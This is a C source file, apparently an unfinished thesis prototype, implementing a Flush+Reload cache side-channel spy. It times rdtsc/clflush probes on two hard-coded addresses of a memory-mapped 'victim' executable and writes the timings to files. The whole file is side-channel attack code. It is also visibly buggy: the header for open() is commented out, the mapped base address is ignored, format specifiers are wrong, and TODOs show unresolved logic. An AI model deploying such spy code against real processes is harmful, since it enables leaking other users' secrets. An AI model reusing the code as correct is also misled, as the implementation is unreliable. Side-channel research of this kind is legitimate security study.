//#include <fcntl.h> // TODO remove unneeded libs
//#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <stdint.h>

#define THRESHOLD 300
#define CYCLE_AMOUNT 200000

// DaGe f+r implementation
#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++); // importance?

// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;

    // where are we using edx?
    // when do we write something into %1?? and output (%0)
    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

// spy process probing certain memory addresses
// https://stackoverflow.com/questions/13772567/how-to-get-the-cpu-cycle-count-in-x86-64-from-c
static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

// write measurements to file
void writer(char **target_adrs, int adrs_amount, unsigned int measurements[][CYCLE_AMOUNT])
{
    char name_buf[50];
    char result_buf[20];
    for(int i=0; i<adrs_amount; i++)
    {
        char *ptr = target_adrs[i];
        sprintf(name_buf, "%s%p%s%lld%s", "measurements_",ptr,"_",rdtsc(),".txt");
        FILE *file = fopen(name_buf, "w");
        if (file == NULL)
        {
            printf("Failed to open the file.\n");
            return; // Exit
        }
        for (int j=0; j<CYCLE_AMOUNT; j++)
        {
            sprintf(result_buf, "%d\n", measurements[i][j]);
            fprintf(file, result_buf);
        }

        fclose(file);
    }
    
}

/**
 * loop
 * probe addresses and safe results in lists (or define length ("buffer") at beginning and just fill array)
 * wait (how to ensure constant duration of time slots?)
 * if no cache hits for X times or array full finish and create files with timings
 */
void spy(char **target_adrs, int adrs_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    unsigned int measurements[adrs_amount][CYCLE_AMOUNT]; // results
    for(int cur_slot=0;cur_slot<CYCLE_AMOUNT;cur_slot++)
    {
        // update time stamps
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            //printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
            //busy_wait((2500-tsc+old_tsc) / 50);
            tsc = rdtsc();
        }
        printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            measurements[cur_adr_i][cur_slot]=probe_precise(ptr); 
            //printf("measured value for adrs %p is %i\n", ptr, measurements[cur_adr_i][cur_slot]);                             // probe
                                                                                                        // add timing to array for persistence 
        }
                                                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
    }
    writer(target_adrs, adrs_amount, measurements);
    printf("end spy\n");
}

// default address values (?)
int main()
{
    printf("starting\n");
    int map_len = 10; // max size bytes?
    int file_descriptor = open("C:/cygwin64/home/thesis/flush-reload/textexec.exe", O_RDONLY); // hard coded path for the executable used by the victim 
    void *base = mmap(NULL, map_len, PROT_READ, MAP_FILE | MAP_SHARED, file_descriptor, 0);
    printf("binary mapped to %p\n", file_descriptor);

    // TODO offsets (?)

    // TODO switch off ASLR

    char *target_adrs[2];
    target_adrs[0]=(char *) 0x1004010be;//0x0000000100401133;
    target_adrs[1]=(char *) 0x1004010d2;//0x1004010d5; //0x0000000000095f5d;
    int adrs_amount = 2;
    printf("starting spy\n");
    spy(target_adrs, adrs_amount);
    printf("ending\n");    
}

// compile without cygwin1.dll, execute with cygwin1.dll in System32

// TODO status access violation for first time?? lol